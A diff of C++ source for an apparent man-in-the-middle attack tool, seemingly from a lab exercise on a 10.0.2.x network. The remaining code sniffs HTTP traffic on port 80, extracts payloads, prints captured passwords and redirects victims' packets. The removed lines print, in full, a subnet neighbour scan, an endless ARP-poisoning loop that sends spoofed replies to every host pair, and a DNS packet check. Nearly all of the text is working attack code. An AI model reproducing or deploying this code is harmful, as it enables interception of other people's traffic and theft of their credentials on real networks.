@@ -5,14 +5,13 @@
 #include "../header/mitmAttack.h"
 #include <unistd.h>
 #include <netinet/tcp.h>
-#include <netinet/udp.h>
 
 
 bool mitmAttack::checkIsHTTP(const uint8_t* buffer, int bufferSize)
 {
     uint8_t* start = const_cast<uint8_t*>(buffer);
     size_t ethHdrSize = sizeof(ethhdr);
-    if(bufferSize < ethHdrSize)
+    if(bufferSize < 0 || (size_t)bufferSize < ethHdrSize)
     {
         return false;
     }
@@ -23,7 +22,7 @@ bool mitmAttack::checkIsHTTP(const uint8_t* buffer, int bufferSize)
         return false;
     }
     size_t ipHdrSize = ipHeader->ihl * 4;
-    if(bufferSize < ethHdrSize + ipHdrSize)
+    if(bufferSize < 0 || (size_t)bufferSize < ethHdrSize + ipHdrSize)
     {
         return false;
     }
@@ -31,29 +30,7 @@ bool mitmAttack::checkIsHTTP(const uint8_t* buffer, int bufferSize)
     uint16_t port = ntohs(tcpHeader->dest);
     return (port == 80);
 }
-bool mitmAttack::checkIsDNS(const uint8_t* buffer, int bufferSize)
-{
-    uint8_t* start = const_cast<uint8_t*>(buffer);
-    size_t ethHdrSize = sizeof(ethhdr);
-    if(bufferSize < ethHdrSize)
-    {
-        return false;
-    }
-    iphdr* ipHeader = reinterpret_cast<iphdr*>(start + ethHdrSize);
-    uint8_t protocol = ipHeader->protocol;
-    if(protocol != IPPROTO_UDP)
-    {
-        return false;
-    }
-    size_t ipHdrSize = ipHeader->ihl * 4;
-    if(bufferSize < ethHdrSize + ipHdrSize)
-    {
-        return false;
-    }
-    udphdr* udpHeader = reinterpret_cast<udphdr*>(start + ethHdrSize + ipHdrSize); 
-    uint16_t port = ntohs(udpHeader->dest);
-    return (port == 53);
-}
+
 std::string mitmAttack::getHTTPpayload(const uint8_t* buffer, int bufferSize)
 {
     // we ignore buffer size check before TCP header since this function is called after checkIsHTTP
@@ -116,95 +93,6 @@ void mitmAttack::extractHTTPpayload(std::string& payload)
     std::cout << "Password: " << password << std::endl;
 }
 
-void mitmAttack::setupSocket(const char* interface) {
-
-    uint32_t ifIP = util::getIPOfInterface(interface);
-    std::array<uint8_t, 6> ifMac = util::getMacOfInterface(interface);
-    
-    std::cerr << "[INFO] setupSocket: interface " << interface << " has ip " << util::ipToString(ifIP) << " and mac " << util::macToString(ifMac.data()) << std::endl;
-    
-    arp = arpSocket();
-    arp.createSocket(interface);
-    arp.setSourceAddress(ifIP, ifMac);
-
-    ip = ipSocket();
-    ip.createSocket(interface);
-    ip.setSourceAddress(ifIP, ifMac);
-    
-}
-
-void mitmAttack::getNeighbours() {
-    arp.setTimeout(0, 10000); // 0.01 sec
-    std::cout << "Scanning neighbours";
-    std::cout.flush();
-    for(int i = 1; i <= 254; i++)
-    {
-        if(i % 25 == 0)
-        {
-            std::cout << ".";
-            std::cout.flush();
-        }
-        std::string targetIp = "10.0.2." + std::to_string(i);
-        std::array<uint8_t, 6> mac = arp.getMacAddress(targetIp.c_str(), 1);
-        if(mac == std::array<uint8_t, 6>{0, 0, 0, 0, 0, 0})
-        {
-            continue;
-        }
-        IPToMac[util::stringToIp(targetIp.c_str())] = mac;
-    }
-    std::cout << " Done!" << std::endl;
-    std::cout << "Available devices: \n"
-        "---------------------\n" 
-        "IP Address\tMAC Address\n"
-        "---------------------" << std::endl;
-    for(auto& it : IPToMac) {
-        std::cout << util::ipToString(it.first) << "\t";
-        for(int i = 0; i < 6; i++) {
-            std::cout << std::setw(2) << std::setfill('0') << 
-                std::hex << (int)it.second[i];
-            if(i != 5) {
-                std::cout << ":";
-            }
-        }
-        std::cout << std::dec << std::endl;
-    }
-    std::cout << std::endl;
-    arp.setTimeout(0, 0); // reset timeout
-}
-
-void mitmAttack::poisonNeighbours() {
-    while(true) {
-        // bool recv = false;
-        // arpPacket request;
-        // sockaddr_ll sll;
-        // if(arp.getArpRequest(&request, &sll, true)) {
-        //     uint32_t targetIp = request.targetIp;
-        //     uint32_t senderIp = request.senderIp;
-        //     std::cerr << "[INFO] poisonNeighbours: received arp request from " << util::ipToString(senderIp) << " for " << util::ipToString(targetIp) << std::endl;
-        //     for(int i = 0; i < 100; i++)
-        //     {
-        //         arp.sendArpReply(&request, &sll);
-        //         usleep(100000); // 0.1 sec
-        //     }
-        // }
-
-        if(IPToMac.size() == 0) {
-            std::cerr << "[WARN] poisonNeighbours: no neighbours found" << std::endl;
-            return;
-        }
-        for(auto& it : IPToMac) {
-            for(auto& target : IPToMac) {
-                if(it.first == target.first) {
-                    continue;
-                }
-                // std::cerr << "[INFO] poisonNeighbours: sending arp reply to " << util::ipToString(it.first) << " for " << util::ipToString(target.first) << std::endl;
-                arp.sendArpReply(target.second, target.first, it.first);
-            }
-        }
-        sleep(1);
-    }
-}
-
 void mitmAttack::processPackets(const char* interface) {
     uint32_t gatewayIp = util::getDefaultGateway(interface);
     std::array<uint8_t, 6> gatewayMac;
@@ -219,7 +107,7 @@ void mitmAttack::processPackets(const char* interface) {
     while(true) 
     {
         int recvSize = ip.receivePacketToMe(buffer, bufferSize);
-        ethhdr* ethHeader = reinterpret_cast<ethhdr*>(buffer);
+        // ethhdr* ethHeader = reinterpret_cast<ethhdr*>(buffer);
         iphdr* ipHeader = reinterpret_cast<iphdr*>(buffer + sizeof(ethhdr));
         uint32_t destIp = ipHeader->daddr;
         if(ip.checkNeedRedirect(ipHeader))
